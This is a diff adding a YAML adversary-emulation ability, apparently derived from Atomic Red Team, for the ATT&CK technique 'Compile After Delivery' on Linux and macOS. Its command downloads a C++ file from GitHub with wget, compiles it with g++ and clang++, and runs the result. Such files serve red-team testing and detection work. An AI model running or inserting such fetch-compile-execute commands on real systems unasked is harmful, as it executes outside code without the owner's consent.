@@ -1,0 +1,27 @@
+---
+- id: c081f353c1dc183c9849f9f9a560c440
+  name: CC compile
+  description: 'Compile a c file with either gcc or clang on FreeBSD, Linux or Macos.
+
+    '
+  tactic: stealth
+  technique:
+    attack_id: T1027.004
+    name: 'Obfuscated Files or Information: Compile After Delivery'
+  platforms:
+    linux:
+      sh:
+        command: 'if [ -e  d7822f_T1027-004-test.cc ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.cc
+          -O d7822f_T1027-004-test.cc; fi;  g++ d7822f_T1027-004-test.cc && ./a.out;
+          clang++ d7822f_T1027-004-test.cc && ./a.out'
+        payloads:
+        - d7822f_T1027-004-test.cc
+        cleanup: ''
+    darwin:
+      sh:
+        command: 'if [ -e  d7822f_T1027-004-test.cc ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.cc
+          -O d7822f_T1027-004-test.cc; fi;  g++ d7822f_T1027-004-test.cc && ./a.out;
+          clang++ d7822f_T1027-004-test.cc && ./a.out'
+        payloads:
+        - d7822f_T1027-004-test.cc
+        cleanup: ''
